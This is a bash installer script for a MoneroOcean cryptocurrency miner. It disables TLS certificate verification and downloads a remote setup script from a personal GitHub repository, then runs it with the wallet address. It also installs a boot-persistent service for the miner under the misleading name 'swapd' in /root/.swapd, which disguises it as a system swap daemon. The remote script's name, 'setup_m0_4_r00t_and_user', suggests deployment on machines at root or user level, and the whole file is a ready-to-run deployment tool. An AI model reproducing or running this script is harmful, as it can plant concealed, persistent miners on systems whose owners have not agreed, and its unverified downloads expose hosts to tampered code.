#!/bin/bash

# MoneroOcean Miner Setup - With Systemd Installation and Legacy Support
# This script handles systems without systemd and old SSL/curl versions

VERSION=2.7

echo "========================================================================="
echo "MoneroOcean Miner Setup Script v$VERSION"
echo "========================================================================="
echo ""

# ========================================================================
# STEP 1: CHECK AND INSTALL SYSTEMD
# ========================================================================

echo "[*] Checking for systemd..."

if ! command -v systemctl &> /dev/null; then
    echo "[WARNING] systemctl not found - systemd is not installed or not available"
    echo "[*] Attempting to install systemd..."
    
    # Detect OS
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VER=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
        VER=$(cat /etc/redhat-release | grep -oP '\d+' | head -1)
    else
        OS="unknown"
    fi
    
    echo "[*] Detected OS: $OS $VER"
    
    case "$OS" in
        "centos"|"rhel")
            VER_MAJOR=$(echo $VER | cut -d. -f1)
            
            if [ "$VER_MAJOR" -ge 7 ]; then
                echo "[*] Installing systemd on RHEL/CentOS 7+..."
                yum install -y systemd
            else
                echo "[ERROR] CentOS/RHEL $VER_MAJOR is too old for systemd"
                echo "[*] Systemd requires CentOS/RHEL 7 or newer"
                echo "[*] This system will use SysV init fallback mode"
                USE_SYSV=true
            fi
            ;;
            
        "debian"|"ubuntu")
            echo "[*] Installing systemd on Debian/Ubuntu..."
            apt-get update
            apt-get install -y systemd
            ;;
            
        "fedora")
            echo "[*] Installing systemd on Fedora..."
            dnf install -y systemd
            ;;
            
        *)
            echo "[WARNING] Unknown OS: $OS"
            echo "[*] Will attempt generic installation..."
            
            # Try different package managers
            if command -v apt-get &> /dev/null; then
                apt-get update && apt-get install -y systemd
            elif command -v yum &> /dev/null; then
                yum install -y systemd
            elif command -v dnf &> /dev/null; then
                dnf install -y systemd
            else
                echo "[ERROR] No supported package manager found"
                USE_SYSV=true
            fi
            ;;
    esac
    
    # Check if systemd is now available
    if command -v systemctl &> /dev/null; then
        echo "[SUCCESS] systemd installed successfully"
        
        # Try to switch to systemd if not running
        if [ ! -d /run/systemd/system ]; then
            echo "[WARNING] systemd is installed but not running"
            echo "[WARNING] System may need reboot to use systemd"
            echo "[*] Will use SysV init fallback for now"
            USE_SYSV=true
        fi
    else
        echo "[WARNING] systemd installation failed or not supported"
        echo "[*] Will use SysV init fallback mode"
        USE_SYSV=true
    fi
else
    echo "[SUCCESS] systemd is available"
    USE_SYSV=false
fi

echo ""

# ========================================================================
# STEP 2: FIX CURL/SSL ISSUES FOR OLD SYSTEMS
# ========================================================================

echo "[*] Checking curl and SSL capabilities..."

# Test if curl can connect to GitHub
if ! curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then
    echo "[WARNING] curl cannot connect to GitHub (likely SSL/TLS issue)"
    echo "[*] Attempting to fix..."
    
    # Update curl and openssl
    if command -v yum &> /dev/null; then
        echo "[*] Updating curl and openssl (RHEL/CentOS)..."
        yum install -y curl openssl ca-certificates nss
        
        # For very old CentOS 5/6, use wget instead
        if ! curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then
            echo "[*] curl still failing, installing wget as fallback..."
            yum install -y wget
            
            # Use wget for downloads instead
            USE_WGET=true
        fi
        
    elif command -v apt-get &> /dev/null; then
        echo "[*] Updating curl and openssl (Debian/Ubuntu)..."
        apt-get update
        apt-get install -y curl openssl ca-certificates wget
    fi
    
    # Final check
    if ! curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then
        if command -v wget &> /dev/null; then
            echo "[*] Using wget instead of curl for downloads"
            USE_WGET=true
        else
            echo "[ERROR] Cannot download from GitHub - both curl and wget failed"
            echo "[*] Please manually update curl/openssl or install wget"
            exit 1
        fi
    fi
else
    echo "[SUCCESS] curl can connect to GitHub"
    USE_WGET=false
fi

echo ""

# ========================================================================
# DOWNLOAD FUNCTION - HANDLES BOTH CURL AND WGET
# ========================================================================

download_file() {
    local url="$1"
    local output="$2"
    
    echo "[*] Downloading: $url"
    
    if [ "$USE_WGET" = true ]; then
        wget --no-check-certificate "$url" -O "$output"
        return $?
    else
        curl -L --insecure "$url" -o "$output"
        return $?
    fi
}

# ========================================================================
# MAIN SCRIPT DOWNLOAD AND EXECUTION
# ========================================================================

echo "[*] Downloading main setup script..."
echo ""

WALLET=$1
EMAIL=$2

if [ -z "$WALLET" ]; then
    echo "Usage: $0 <WALLET_ADDRESS> [EMAIL]"
    exit 1
fi

# Download the actual setup script
TEMP_SCRIPT="/tmp/mo_setup_$$.sh"

if download_file "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_m0_4_r00t_and_user_FINAL_CLEAN.sh" "$TEMP_SCRIPT"; then
    echo "[SUCCESS] Main script downloaded"
    
    # Modify the script to use SysV if needed
    if [ "$USE_SYSV" = true ]; then
        echo "[*] Adapting script for SysV init (no systemd)..."
        
        # Add SysV init script creation instead of systemd
        cat >> "$TEMP_SCRIPT" << 'EOFMOD'

# ========================================================================
# SYSV INIT FALLBACK (for systems without systemd)
# ========================================================================

if [ ! -d /run/systemd/system ]; then
    echo "[*] Creating SysV init script for swapd..."
    
    cat > /etc/init.d/swapd << 'EOFSYSV'
#!/bin/bash
# chkconfig: 2345 99 01
# description: Swap Daemon Miner Service

DAEMON=/root/.swapd/swapd
CONFIG=/root/.swapd/config.json
PIDFILE=/var/run/swapd.pid

case "$1" in
    start)
        echo "Starting swapd..."
        if [ -f $PIDFILE ]; then
            echo "Already running (PID: $(cat $PIDFILE))"
        else
            nohup $DAEMON --config=$CONFIG > /dev/null 2>&1 &
            echo $! > $PIDFILE
            echo "Started with PID $(cat $PIDFILE)"
        fi
        ;;
    stop)
        echo "Stopping swapd..."
        if [ -f $PIDFILE ]; then
            kill $(cat $PIDFILE)
            rm -f $PIDFILE
        fi
        killall swapd 2>/dev/null
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    status)
        if [ -f $PIDFILE ]; then
            if ps -p $(cat $PIDFILE) > /dev/null; then
                echo "swapd is running (PID: $(cat $PIDFILE))"
            else
                echo "swapd is not running (stale PID file)"
            fi
        else
            echo "swapd is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac
EOFSYSV
    
    chmod +x /etc/init.d/swapd
    
    # Enable on boot
    if command -v chkconfig &> /dev/null; then
        chkconfig --add swapd
        chkconfig swapd on
    elif command -v update-rc.d &> /dev/null; then
        update-rc.d swapd defaults
    fi
    
    # Start the service
    /etc/init.d/swapd start
    
    echo "[*] SysV init script created and started"
fi

EOFMOD
    fi
    
    # Execute the main script
    chmod +x "$TEMP_SCRIPT"
    bash "$TEMP_SCRIPT" "$WALLET" "$EMAIL"
    
    rm -f "$TEMP_SCRIPT"
else
    echo "[ERROR] Failed to download main setup script"
    exit 1
fi

echo ""
echo "========================================================================="
echo "Installation Complete!"
echo "========================================================================="
if [ "$USE_SYSV" = true ]; then
    echo "Service management commands:"
    echo "  Start:   /etc/init.d/swapd start"
    echo "  Stop:    /etc/init.d/swapd stop"
    echo "  Status:  /etc/init.d/swapd status"
else
    echo "Service management commands:"
    echo "  Start:   systemctl start swapd"
    echo "  Stop:    systemctl stop swapd"
    echo "  Status:  systemctl status swapd"
fi
echo "========================================================================="
